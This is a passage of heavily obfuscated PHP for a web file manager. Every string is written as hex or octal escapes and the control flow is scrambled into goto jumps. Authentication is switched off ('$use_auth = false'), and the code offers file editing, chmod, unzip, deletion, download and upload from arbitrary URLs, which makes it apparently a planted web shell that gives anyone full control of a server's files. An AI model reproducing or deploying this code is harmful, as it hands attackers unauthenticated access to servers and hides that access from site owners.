                        <?php  } if ($is_image) { $image_size = getimagesize($file_path); echo "\x49\155\141\147\145\x20\163\151\172\x65\163\x3a\x20" . (isset($image_size[0]) ? $image_size[0] : "\60") . "\x20\x78\40" . (isset($image_size[1]) ? $image_size[1] : "\60") . "\x3c\x62\x72\x3e"; } if ($is_text) { $is_utf8 = rf_is_utf8($content); if (function_exists("\x69\143\157\156\166")) { if (!$is_utf8) { $content = iconv(rf_ICONV_INPUT_ENC, "\125\124\x46\x2d\x38\x2f\57\x49\107\x4e\117\122\105", $content); } } echo "\103\150\141\162\163\x65\x74\72\x20" . ($is_utf8 ? "\165\x74\146\x2d\70" : "\70\40\x62\151\x74") . "\x3c\142\x72\x3e"; } ?>
                </p>
                <p>
                    <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;dl=<?php  echo urlencode($file); ?>
"><i class="fa fa-cloud-download"></i> <?php  echo lng("\x44\x6f\x77\156\x6c\x6f\141\x64"); ?>
</a></b> &nbsp;
                    <b><a href="<?php  echo rf_enc($file_url); ?>
" target="_blank"><i class="fa fa-external-link-square"></i> <?php  echo lng("\117\x70\145\156"); ?>
</a></b>
                    &nbsp;
                    <?php  if (!rf_READONLY && ($is_zip || $is_gzip) && $filenames !== false) { $zip_name = pathinfo($file_path, PATHINFO_FILENAME); ?>
                        <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
"><i class="fa fa-check-circle"></i> <?php  echo lng("\125\x6e\132\151\x70"); ?>
</a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;unzip=<?php  echo urlencode($file); ?>
&amp;tofolder=1" title="UnZip to <?php  echo rf_enc($zip_name); ?>
"><i class="fa fa-check-circle"></i>
                                <?php  echo lng("\125\x6e\x5a\151\160\124\157\106\x6f\x6c\144\x65\162"); ?>
</a></b> &nbsp;
                        <?php  } if ($is_text && !rf_READONLY) { ?>
                        <b><a href="?p=<?php  echo urlencode(trim(rf_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
" class="edit-file"><i class="fa fa-pencil-square"></i> <?php  echo lng("\x45\x64\151\164"); ?>
                            </a></b> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(trim(rf_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&env=ace"
                              class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\101\x64\x76\x61\x6e\143\145\x64\105\x64\151\x74\x6f\x72"); ?>
                            </a></b> &nbsp;
                    <?php  } ?>
                    <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\x42\x61\143\153"); ?>
</a></b>
                </p>
                <?php  } if ($is_onlineViewer) { if ($online_viewer == "\147\x6f\x6f\147\154\x65") { echo "\x3c\x69\146\x72\141\x6d\145\40\x73\162\143\75\x22\x68\164\x74\x70\163\x3a\57\57\144\x6f\x63\x73\x2e\147\157\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x76\151\145\167\145\162\x3f\145\x6d\142\x65\144\144\x65\144\75\x74\162\x75\x65\x26\150\x6c\x3d\145\x6e\46\x75\162\x6c\75" . rf_enc($file_url) . "\42\40\x66\x72\141\x6d\145\142\157\162\x64\145\162\x3d\x22\x6e\157\x22\x20\x73\164\171\154\x65\x3d\42\167\151\x64\164\x68\x3a\x31\x30\60\x25\x3b\x6d\151\x6e\x2d\150\145\x69\147\150\x74\x3a\x34\x36\60\160\x78\x22\x3e\74\57\x69\x66\x72\x61\155\x65\x3e"; } else { if ($online_viewer == "\155\x69\x63\x72\157\163\157\146\164") { echo "\74\151\146\x72\141\x6d\x65\x20\x73\x72\143\x3d\x22\x68\164\x74\160\163\x3a\57\57\166\151\145\x77\56\157\146\146\x69\x63\145\141\x70\160\163\x2e\154\x69\x76\145\x2e\143\x6f\x6d\57\157\160\57\145\x6d\142\145\x64\x2e\141\163\x70\x78\77\x73\x72\x63\75" . rf_enc($file_url) . "\x22\x20\x66\162\141\155\145\x62\157\x72\144\x65\162\x3d\42\x6e\157\42\40\163\164\171\154\x65\75\x22\x77\151\144\x74\x68\x3a\x31\x30\60\x25\x3b\x6d\151\156\55\x68\145\151\147\150\164\72\64\x36\60\x70\x78\42\x3e\74\57\151\146\162\x61\x6d\x65\x3e"; } } } elseif ($is_zip) { if ($filenames !== false) { echo "\x3c\143\157\144\x65\40\143\154\x61\163\163\75\x22\x6d\x61\170\150\145\151\x67\150\164\x22\x3e"; foreach ($filenames as $fn) { if ($fn["\x66\157\x6c\144\x65\x72"]) { echo "\74\x62\76" . rf_enc($fn["\x6e\x61\155\145"]) . "\74\x2f\x62\x3e\x3c\142\x72\x3e"; } else { echo $fn["\156\x61\155\145"] . "\x20\50" . rf_get_filesize($fn["\146\x69\154\145\x73\151\x7a\145"]) . "\51\74\x62\162\76"; } } echo "\74\57\143\x6f\x64\145\76"; } else { echo "\74\x70\76\x45\x72\162\x6f\x72\x20\167\x68\x69\x6c\145\40\x66\145\164\x63\x68\151\156\147\40\141\x72\143\x68\151\x76\x65\x20\151\156\146\x6f\74\x2f\x70\x3e"; } } elseif ($is_image) { if (in_array($ext, array("\x67\151\146", "\152\160\147", "\x6a\160\x65\147", "\160\x6e\147", "\x62\x6d\160", "\x69\x63\157", "\163\x76\x67"))) { echo "\74\160\x3e\x3c\151\155\147\40\x73\x72\143\x3d\x22" . rf_enc($file_url) . "\42\x20\141\154\164\75\x22\x22\40\143\x6c\x61\163\163\x3d\x22\x70\162\145\166\151\145\x77\x2d\x69\155\x67\x22\76\x3c\57\x70\76"; } } elseif ($is_audio) { echo "\x3c\160\76\74\x61\165\144\x69\157\x20\x73\x72\x63\x3d\42" . rf_enc($file_url) . "\x22\x20\143\157\156\x74\162\x6f\154\x73\x20\x70\x72\x65\x6c\157\x61\x64\75\42\155\x65\x74\x61\144\141\x74\x61\x22\76\x3c\x2f\141\x75\x64\x69\x6f\x3e\74\x2f\x70\76"; } elseif ($is_video) { echo "\x3c\x64\151\x76\40\143\x6c\x61\x73\163\x3d\42\x70\162\145\166\x69\145\167\x2d\x76\151\144\x65\157\x22\76\x3c\166\x69\144\x65\x6f\x20\x73\162\x63\75\42" . rf_enc($file_url) . "\42\x20\x77\x69\144\164\x68\x3d\42\66\64\60\42\x20\150\x65\151\x67\x68\x74\x3d\x22\63\x36\x30\42\40\x63\157\156\164\162\x6f\154\163\40\x70\x72\145\154\157\141\144\75\x22\x6d\x65\164\x61\x64\141\x74\x61\x22\x3e\74\57\166\x69\144\145\x6f\76\74\57\x64\x69\166\x3e"; } elseif ($is_text) { if (rf_USE_HIGHLIGHTJS) { $hljs_classes = array("\163\150\x74\155\x6c" => "\170\x6d\x6c", "\x68\164\141\x63\143\x65\x73\163" => "\x61\160\141\x63\150\x65", "\160\150\164\x6d\154" => "\160\150\160", "\x6c\x6f\x63\x6b" => "\152\163\157\156", "\163\x76\x67" => "\170\155\x6c"); $hljs_class = isset($hljs_classes[$ext]) ? "\154\141\156\x67\x2d" . $hljs_classes[$ext] : "\x6c\141\156\147\x2d" . $ext; if (empty($ext) || in_array(strtolower($file), rf_get_text_names()) || preg_match("\43\134\56\x6d\x69\156\x5c\56\50\x63\x73\163\x7c\152\x73\x29\x24\43\151", $file)) { $hljs_class = "\156\x6f\x68\151\147\150\154\x69\147\x68\164"; } $content = "\x3c\160\162\145\40\x63\154\x61\163\x73\75\x22\167\x69\164\x68\55\150\154\152\x73\x22\x3e\74\143\x6f\144\145\40\143\154\x61\163\163\x3d\x22" . $hljs_class . "\x22\x3e" . rf_enc($content) . "\74\57\143\x6f\x64\x65\x3e\74\57\160\x72\145\76"; } elseif (in_array($ext, array("\160\150\160", "\160\150\160\x34", "\x70\150\160\x35", "\160\150\x74\x6d\x6c", "\160\x68\160\163"))) { $content = highlight_string($content, true); } else { $content = "\74\x70\162\145\x3e" . rf_enc($content) . "\x3c\x2f\x70\162\145\x3e"; } echo $content; } ?>
        </div>
    </div>
    <?php  if (!$quickView) { rf_show_footer(); } die; } goto Gnpij; E14YI: function rf_get_text_exts() { return array("\x74\x78\x74", "\x63\x73\x73", "\151\156\151", "\x63\157\156\x66", "\x6c\157\147", "\x68\x74\141\x63\143\145\163\163", "\x70\x61\163\x73\x77\144", "\146\x74\x70\x71\165\157\164\x61", "\x73\x71\154", "\x6a\163", "\152\163\157\156", "\163\150", "\x63\157\x6e\146\x69\147", "\x70\150\160", "\x70\x68\160\x34", "\160\150\160\x35", "\160\150\x70\x73", "\x70\150\164\155\x6c", "\x68\164\155", "\x68\164\155\x6c", "\163\x68\164\x6d\x6c", "\x78\150\164\155\x6c", "\x78\155\154", "\x78\163\x6c", "\x6d\63\x75", "\155\63\x75\x38", "\160\x6c\163", "\x63\165\145", "\145\x6d\x6c", "\x6d\163\147", "\x63\163\x76", "\142\x61\x74", "\164\167\151\x67", "\164\x70\x6c", "\x6d\144", "\147\151\x74\x69\x67\x6e\157\162\x65", "\154\145\x73\x73", "\163\x61\x73\163", "\163\143\163\163", "\x63", "\143\160\160", "\x63\163", "\x70\x79", "\x6d\141\160", "\x6c\157\143\153", "\144\164\144", "\x73\x76\147", "\x73\x63\163\163", "\x61\163\160", "\x61\x73\160\x78", "\x61\163\170", "\141\163\155\170", "\x61\163\150\170", "\152\x73\x78", "\x6a\x73\x70", "\x6a\x73\160\170", "\x63\146\x6d", "\143\x67\151"); } goto ES_eY; OuRo_: defined("\x72\x66\x5f\x53\105\x4c\106\x5f\125\122\x4c") || define("\162\x66\x5f\x53\x45\114\x46\137\x55\122\114", ($is_https ? "\150\164\164\160\163" : "\x68\164\x74\x70") . "\72\57\57" . $http_host . $_SERVER["\120\x48\x50\137\x53\105\114\x46"]); goto Nywcq; z8DHn: echo VERSION; goto CzeSS; gmQqE: function get_absolute_path($path) { $path = str_replace(array("\x2f", "\x5c"), DIRECTORY_SEPARATOR, $path); $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), "\x73\164\162\154\145\x6e"); $absolutes = array(); foreach ($parts as $part) { if ("\56" == $part) { continue; } if ("\x2e\x2e" == $part) { array_pop($absolutes); } else { $absolutes[] = $part; } } return implode(DIRECTORY_SEPARATOR, $absolutes); } goto YfqYI; LFz5p: defined("\x72\146\x5f\106\111\114\105\137\x45\x58\x54\105\116\123\111\x4f\x4e") || define("\x72\146\137\x46\111\x4c\x45\x5f\x45\x58\124\x45\116\x53\x49\117\116", $allowed_file_extensions); goto mZN8V; opdtV: rf_show_message(); goto BVXtM; xV3lX: defined("\162\x66\137\x45\130\103\114\125\x44\105\x5f\111\x54\x45\115\x53") || define("\x72\x66\x5f\105\130\x43\114\x55\104\x45\137\111\124\x45\x4d\x53", $exclude_items); goto b5sb0; afDDR: if (false) { } else { $_SESSION[rf_SESSION_ID] = array(); } goto O8se2; MhhAq: if (!is_dir($path)) { rf_redirect(rf_SELF_URL . "\77\160\75"); } goto Dg1fH; LNze_: ?>
</th>
                <th><?php  goto BFHCd; OHDLr: $use_auth = false; goto WB4Nm; qGdYW: function rf_get_directorysize($directory) { global $calc_folder; if ($calc_folder == true) { $size = 0; $count = 0; $dirCount = 0; foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file) { if ($file->isFile()) { $size += $file->getSize(); $count++; } else { if ($file->isDir()) { $dirCount++; } } } return $size; } else { return "\x46\x6f\x6c\144\x65\162"; } } goto Qq1ch; KZ9bh: $online_viewer = "\147\x6f\157\x67\x6c\x65"; goto Td0sR; ZC8o1: $root_url = ''; goto Wft1K; iVu9l: rf_show_nav_path(rf_PATH); goto opdtV; TTtqL: if (isset($_SESSION[rf_SESSION_ID]["\x6c\157\x67\147\x65\144"]) && !empty($directories_users[$_SESSION[rf_SESSION_ID]["\154\x6f\147\147\145\144"]])) { $wd = rf_clean_path(dirname($_SERVER["\120\110\120\137\123\x45\x4c\x46"])); $root_url = $root_url . $wd . DIRECTORY_SEPARATOR . $directories_users[$_SESSION[rf_SESSION_ID]["\154\x6f\147\x67\x65\144"]]; } goto Hmq1D; xUkx1: if (!rf_READONLY && ($num_files != 0 || $num_folders != 0)) { ?>
    <div style="margin-top: 4px">
        <center>
            <ul style="margin: 0" class="list-inline footer-action">
                <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php  echo lng("\x53\145\154\145\143\164\101\154\x6c"); ?>
 </a></li>
                <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php  echo lng("\x55\x6e\123\x65\154\x65\x63\164\101\x6c\154"); ?>
 </a></li>
                <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php  echo lng("\x49\156\166\x65\x72\x74\x53\145\154\x65\x63\164\151\157\x6e"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('Delete selected files and folders?')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php  echo lng("\x44\145\x6c\x65\x74\x65"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('Create archive?')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\132\151\160"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('Create archive?')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\x54\141\162"); ?>
 </a></li>
                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php  echo lng("\x43\x6f\x70\x79"); ?>
 </a></li>
            </ul>
        </center>
        </div>
    <?php  } goto Xwsbm; XP2FH: if (isset($_GET["\144\154"])) { $dl = $_GET["\144\154"]; $dl = rf_clean_path($dl); $dl = str_replace("\57", '', $dl); $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } if ($dl != '' && is_file($path . "\x2f" . $dl)) { rf_download_file($path . "\x2f" . $dl, $dl, 1024); die; } else { rf_set_msg("\x46\x69\154\145\x20\156\157\x74\40\x66\x6f\x75\156\144", "\145\162\162\157\162"); rf_redirect(rf_SELF_URL . "\77\160\75" . urlencode(rf_PATH)); } } goto usfq_; Ma9rl: function rf_is_exclude_items($file) { $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); if (!in_array($file, rf_EXCLUDE_ITEMS) && !in_array("\52\x2e{$ext}", rf_EXCLUDE_ITEMS)) { return true; } return false; } goto AhFMo; AQwlR: define("\x72\x66\x5f\x55\x53\105\x5f\101\x55\124\x48", $use_auth); goto nFwi6; stgU4: function rf_set_msg($msg, $status = "\x6f\x6b") { $_SESSION[rf_SESSION_ID]["\x6d\x65\x73\163\x61\x67\x65"] = $msg; $_SESSION[rf_SESSION_ID]["\163\164\141\x74\x75\163"] = $status; } goto rZiL3; tTVjW: defined("\162\x66\137\123\110\x4f\x57\137\110\x49\104\104\105\116") || define("\x72\x66\137\x53\x48\x4f\127\137\x48\x49\104\104\105\116", $show_hidden_files); goto cZRbq; wn5NX: echo rf_enc(rf_PATH); goto deMPM; TExSq: ?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php  goto wn5NX; AU7jk: if (!defined("\162\146\x5f\x53\105\123\x53\x49\117\x4e\137\111\x44")) { define("\x72\146\x5f\123\105\123\x53\111\x4f\116\x5f\x49\x44", "\x66\151\154\x65\x6d\141\156\141\x67\x65\x72"); } goto kB0EQ; Hmq1D: $root_url = rf_clean_path($root_url); goto M_SBk; aoysR: if (isset($_GET["\x75\156\172\151\160"]) && !rf_READONLY) { $unzip = $_GET["\x75\156\x7a\151\160"]; $unzip = rf_clean_path($unzip); $unzip = str_replace("\57", '', $unzip); $isValid = false; $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\57" . rf_PATH; } if ($unzip != '' && is_file($path . "\57" . $unzip)) { $zip_path = $path . "\x2f" . $unzip; $ext = pathinfo($zip_path, PATHINFO_EXTENSION); $isValid = true; } else { rf_set_msg("\106\151\x6c\x65\x20\156\x6f\x74\40\146\x6f\x75\156\x64", "\x65\x72\x72\157\x72"); } if ($ext == "\x7a\151\x70" && !class_exists("\132\x69\160\101\x72\143\x68\151\166\x65") || $ext == "\164\141\x72" && !class_exists("\x50\150\141\162\x44\x61\164\x61")) { rf_set_msg("\117\x70\145\x72\x61\164\x69\157\x6e\163\x20\x77\x69\164\150\x20\x61\x72\x63\x68\151\x76\x65\x73\x20\141\162\x65\40\x6e\x6f\164\40\x61\x76\141\x69\154\x61\x62\x6c\145", "\x65\162\x72\157\162"); rf_redirect(rf_SELF_URL . "\77\x70\75" . urlencode(rf_PATH)); } if ($isValid) { $tofolder = ''; if (isset($_GET["\x74\x6f\x66\157\154\x64\145\x72"])) { $tofolder = pathinfo($zip_path, PATHINFO_FILENAME); if (rf_mkdir($path . "\57" . $tofolder, true)) { $path .= "\x2f" . $tofolder; } } if ($ext == "\172\151\160") { $zipper = new rf_Zipper(); $res = $zipper->unzip($zip_path, $path); } elseif ($ext == "\164\x61\162") { try { $gzipper = new PharData($zip_path); if (@$gzipper->extractTo($path, null, true)) { $res = true; } else { $res = false; } } catch (Exception $e) { $res = true; } } if ($res) { rf_set_msg("\x41\162\x63\x68\x69\x76\145\40\165\x6e\160\141\x63\153\x65\144"); } else { rf_set_msg("\x41\162\143\150\x69\x76\x65\x20\x6e\157\164\40\x75\156\x70\x61\143\153\x65\144", "\x65\162\162\x6f\162"); } } else { rf_set_msg("\106\151\x6c\x65\x20\x6e\157\164\x20\146\157\165\x6e\x64", "\x65\x72\162\157\x72"); } rf_redirect(rf_SELF_URL . "\x3f\160\75" . urlencode(rf_PATH)); } goto GP3ew; cZRbq: defined("\162\x66\x5f\122\117\117\124\137\120\x41\x54\x48") || define("\162\146\x5f\x52\117\117\x54\137\x50\x41\124\110", $root_path); goto yWbST; iaJtI: $path = rf_ROOT_PATH; goto Sr_Ix; WKuZi: if ($report_errors == true) { @ini_set("\x65\x72\162\157\162\x5f\162\145\x70\x6f\x72\164\x69\156\x67", E_ALL); @ini_set("\x64\x69\163\160\154\141\x79\137\145\162\162\x6f\162\x73", 1); } else { @ini_set("\145\162\162\157\162\137\162\145\160\157\162\164\x69\x6e\147", E_ALL); @ini_set("\x64\x69\163\160\x6c\x61\171\137\x65\x72\x72\x6f\x72\x73", 0); } goto QKVSx; crXkE: ?>
</th>
                <th><?php  goto XRllp; gB7_I: $ik = 6070; goto QZmL4; kHMns: function rf_is_file_allowed($filename) { $allowed = false; if (rf_EXTENSION) { $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); if (in_array($ext, explode("\54", strtolower(rf_EXTENSION)))) { $allowed = true; } } return $allowed; } goto RiV6t; iGtNZ: $calc_folder = isset($cfg->data["\143\141\154\x63\137\x66\157\154\144\145\x72"]) ? $cfg->data["\x63\141\x6c\143\137\x66\157\x6c\144\x65\x72"] : true; goto QAbNG; rFzQC: if (isset($_GET["\x63\150\155\x6f\x64"]) && !rf_READONLY && !rf_IS_WIN) { $file = $_GET["\x63\x68\x6d\157\144"]; $file = rf_clean_path($file); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\x2f" . $file) && !is_dir($path . "\x2f" . $file)) { rf_set_msg("\x46\x69\154\145\40\x6e\x6f\164\40\146\x6f\x75\x6e\144", "\145\162\x72\157\162"); rf_redirect(rf_SELF_URL . "\77\160\75" . urlencode(rf_PATH)); } rf_show_header(); rf_show_nav_path(rf_PATH); $file_url = rf_ROOT_URL . (rf_PATH != '' ? "\x2f" . rf_PATH : '') . "\57" . $file; $file_path = $path . "\x2f" . $file; $mode = fileperms($path . "\57" . $file); ?>
    <div class="path">
        <div class="card mb-2 <?php  echo rf_get_theme(); ?>
">
            <h6 class="card-header">
                <?php  echo lng("\x43\x68\141\x6e\x67\145\x50\x65\x72\155\x69\163\x73\x69\157\x6e\x73"); ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    Full path: <?php  echo $file_path; ?>
<br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo rf_enc(rf_PATH); ?>
">
                    <input type="hidden" name="chmod" value="<?php  echo rf_enc($file); ?>
">

                    <table class="table compact-table <?php  echo rf_get_theme(); ?>
">
                        <tr>
                            <td></td>
                            <td><b><?php  echo lng("\x4f\x77\156\145\x72"); ?>
</b></td>
                            <td><b><?php  echo lng("\107\162\x6f\x75\x70"); ?>
</b></td>
                            <td><b><?php  echo lng("\x4f\x74\150\x65\162"); ?>
</b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\122\x65\x61\x64"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php  echo $mode & 256 ? "\x20\143\x68\x65\x63\x6b\145\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php  echo $mode & 32 ? "\40\x63\x68\145\x63\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php  echo $mode & 4 ? "\x20\x63\150\x65\143\x6b\145\144" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\x57\162\x69\164\145"); ?>
</b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php  echo $mode & 128 ? "\40\143\150\x65\143\153\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php  echo $mode & 16 ? "\x20\x63\x68\x65\143\x6b\x65\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php  echo $mode & 2 ? "\40\143\150\x65\143\153\145\x64" : ''; ?>
></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php  echo lng("\x45\170\x65\143\x75\x74\x65"); ?>
</b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php  echo $mode & 64 ? "\40\x63\x68\x65\143\153\145\x64" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php  echo $mode & 8 ? "\40\x63\x68\x65\x63\x6b\145\144" : ''; ?>
></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php  echo $mode & 1 ? "\x20\x63\150\x65\x63\x6b\x65\144" : ''; ?>
></label></td>
                        </tr>
                    </table>

                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\x43\150\x61\156\147\x65"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\x43\x61\x6e\143\x65\154"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  rf_show_footer(); die; } goto rC_B6; Mx4kJ: $hide_cols = isset($cfg->data["\x68\x69\x64\x65\137\143\x6f\154\163"]) ? $cfg->data["\x68\x69\x64\145\137\143\x6f\154\x73"] : true; goto iGtNZ; IK6f5: defined("\x72\x66\x5f\110\x49\x47\x48\114\x49\x47\x48\x54\x4a\x53\x5f\123\x54\131\x4c\x45") || define("\x72\146\137\110\111\x47\x48\x4c\x49\107\x48\124\x4a\123\x5f\123\x54\x59\x4c\x45", $highlightjs_style); goto eVWM8; Awoqy: function rf_get_image_exts() { return array("\151\x63\x6f", "\x67\151\x66", "\x6a\160\x67", "\x6a\160\145\147", "\152\160\143", "\152\160\62", "\152\x70\170", "\x78\x62\155", "\167\142\155\160", "\160\x6e\x67", "\x62\155\x70", "\x74\x69\x66", "\164\x69\x66\x66", "\160\163\144", "\163\166\x67"); } goto hTTxG; btLHN: function rf_show_image($img) { $modified_time = gmdate("\x44\54\40\144\x20\x4d\x20\x59\40\x30\60\x3a\x30\x30\72\x30\60") . "\40\x47\x4d\124"; $expires_time = gmdate("\104\x2c\40\144\x20\115\40\131\x20\60\x30\72\x30\60\x3a\60\x30", strtotime("\x2b\x31\x20\144\141\x79")) . "\x20\107\x4d\x54"; $img = trim($img); $images = rf_get_images(); $image = "\x69\x56\102\x4f\x52\x77\60\x4b\x47\147\x6f\x41\x41\101\x41\x4e\x53\x55\150\x45\x55\147\x41\x41\x41\x41\105\x41\101\101\101\x42\103\x41\x59\101\x41\101\101\146\106\x63\123\x4a\x41\x41\101\101\x45\x45\154\105\121\126\122\64\x32\x6d\x4c\x34\x2f\x2f\70\57\101\x30\x43\101\x41\x51\101\x49\57\101\114\53\62\66\x4a\x4e\x46\147\101\101\x41\101\x42\112\122\x55\65\105\162\x6b\112\x67\x67\x67\x3d\75"; if (isset($images[$img])) { $image = $images[$img]; } $image = base64_decode($image); if (function_exists("\x6d\x62\137\x73\164\x72\154\145\156")) { $size = mb_strlen($image, "\x38\x62\151\164"); } else { $size = strlen($image); } if (function_exists("\x68\x65\x61\144\145\162\x5f\x72\145\155\157\166\145")) { header_remove("\103\x61\x63\x68\x65\55\x43\157\x6e\x74\x72\157\x6c"); header_remove("\120\x72\141\x67\x6d\141"); } else { header("\x43\x61\143\150\145\x2d\x43\x6f\x6e\164\162\157\x6c\72"); header("\x50\162\x61\147\155\x61\72"); } header("\x4c\141\x73\x74\x2d\x4d\157\144\151\x66\151\145\x64\x3a\40" . $modified_time, true, 200); header("\x45\x78\160\151\162\145\x73\72\40" . $expires_time); header("\x43\x6f\x6e\x74\145\156\164\x2d\x4c\145\156\x67\x74\150\x3a\40" . $size); header("\x43\x6f\x6e\x74\145\156\x74\x2d\124\171\x70\145\72\x20\151\x6d\141\x67\145\57\x70\156\147"); echo $image; die; } goto g5ICz; I53Fd: echo $tableTheme; goto XO2R8; lzBP6: if (isset($_GET["\x75\x70\x6c\157\x61\144"]) && !rf_READONLY) { rf_show_header(); rf_show_nav_path(rf_PATH); function getUploadExt() { $extArr = explode("\x2c", rf_UPLOAD_EXTENSION); if (rf_UPLOAD_EXTENSION && $extArr) { array_walk($extArr, function (&$x) { $x = "\x2e{$x}"; }); return implode("\54", $extArr); } return ''; } ?>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.css" rel="stylesheet">
    <div class="path">

        <div class="card mb-2 fm-upload-wrapper <?php  echo rf_get_theme(); ?>
">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs">
                    <li class="nav-item">
                        <a class="nav-link active" href="#fileUploader" data-target="#fileUploader"><i class="fa fa-arrow-circle-o-up"></i> <?php  echo lng("\125\160\154\157\x61\x64\151\x6e\x67\x46\151\x6c\145\163"); ?>
</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#urlUploader" class="js-url-upload" data-target="#urlUploader"><i class="fa fa-link"></i> Upload from URL</a>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <p class="card-text">
                    <a href="?p=<?php  echo rf_PATH; ?>
" class="float-right"><i class="fa fa-chevron-circle-left go-back"></i> <?php  echo lng("\x42\141\143\x6b"); ?>
</a>
                    <?php  echo lng("\x44\145\163\x74\151\156\x61\x74\151\157\x6e\x46\x6f\154\144\145\x72"); ?>
: <?php  echo rf_enc(rf_convert_win(rf_ROOT_PATH . "\x2f" . rf_PATH)); ?>
                </p>

                <form action="<?php  echo htmlspecialchars(rf_SELF_URL) . "\77\160\x3d" . rf_enc(rf_PATH); ?>
" class="dropzone card-tabs-container" id="fileUploader" enctype="multipart/form-data">
                    <input type="hidden" name="p" value="<?php  echo rf_enc(rf_PATH); ?>
">
                    <input type="hidden" name="fullpath" id="fullpath" value="<?php  echo rf_enc(rf_PATH); ?>
">
                    <div class="fallback">
                        <input name="file" type="file" multiple/>
                    </div>
                </form>

                <div class="upload-url-wrapper card-tabs-container hidden" id="urlUploader">
                    <form id="js-form-url-upload" class="form-inline" onsubmit="return upload_from_url(this);" method="POST" action="">
                        <input type="hidden" name="type" value="upload" aria-label="hidden" aria-hidden="true">
                        <input type="url" placeholder="URL" name="uploadurl" required class="form-control" style="width: 80%">
                        <button type="submit" class="btn btn-primary ml-3"><?php  echo lng("\125\160\x6c\157\x61\144"); ?>
</button>
                        <div class="lds-facebook"><div></div><div></div><div></div></div>
                    </form>
                    <div id="js-url-upload__list" class="col-9 mt-3"></div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.5.1/min/dropzone.min.js"></script>
    <script>
        Dropzone.options.fileUploader = {
            timeout: 120000,
            maxFilesize: <?php  echo MAX_UPLOAD_SIZE; ?>
,
            acceptedFiles : "<?php  echo getUploadExt(); ?>
",
            init: function () {
                this.on("sending", function (file, xhr, formData) {
                    let _path = (file.fullPath) ? file.fullPath : file.name;
                    document.getElementById("fullpath").value = _path;
                    xhr.ontimeout = (function() {
                        toast('Error: Server Timeout');
                    });
                }).on("success", function (res) {
                    let _response = JSON.parse(res.xhr.response);
                    if(_response.status == "error") {
                        toast(_response.info);
                    }
                }).on("error", function(file, response) {
                    toast(response);
                });
            }
        }
    </script>
